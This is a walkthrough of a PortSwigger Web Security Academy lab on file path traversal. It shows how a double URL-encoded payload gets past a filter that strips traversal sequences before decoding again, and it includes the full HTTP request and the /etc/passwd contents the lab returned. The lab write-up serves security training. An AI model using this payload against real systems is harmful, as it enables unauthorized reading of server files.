# [Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

---

## Description

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application blocks input containing [path traversal](https://portswigger.net/web-security/file-path-traversal) sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

## Solution

View the page source of `/` and note that each product's image is rendered via an `img` take with the `src` attribute set to `/image?filename=$FILENAME`. According to the challenge description, `$FILENAME` is stripped of path traversal sequences like `../` or `..\` and URL-decoded before being used in any file system operations on the backend.

The order of their sanitization efforts is interesting. By stripping away path traversal sequences and *then* URL-decoding the string, it is possible to embed path traversal sequences into the string as URL-encoded characters.

The key is to realize that the web server probably already URL-decodes the `filename` parameter before handing it to the backend code. The order of operations is the following:

```php
$filename = url_decode($filename)
$filename = strip_traversal_sequences($filename)
$filename = url_decode($filename)
```

To exploit this extraneous URL decoding to achieve the final `filename` value of `../../../etc/passwd`, use the following input: `..%252f..%252f..%252fetc/passwd`. It goes through the order of operations as so:

```php
$filename = url_decode($filename)					# ..%252f..%252f..%252fetc/passwd
$filename = strip_traversal_sequences($filename)	# ..%2f..%2f..%2fetc/passwd
$filename = url_decode($filename)					# ../../../etc/passwd
```

Send the request.

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: ac881f741ef869ae811336fd00650080.web-security-academy.net
Cookie: session=yLKTfps13sCzQ9EGp4XRE2H0lMdQhBGi
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

```txt
HTTP/1.1 200 OK
Content-Type: image/jpeg
Connection: close
Content-Length: 1205

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:2001:2001::/home/peter:/bin/bash
carlos:x:2002:2002::/home/carlos:/bin/bash
user:x:2000:2000::/home/user:/bin/bash
elmer:x:2099:2099::/home/elmer:/bin/bash
dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
```
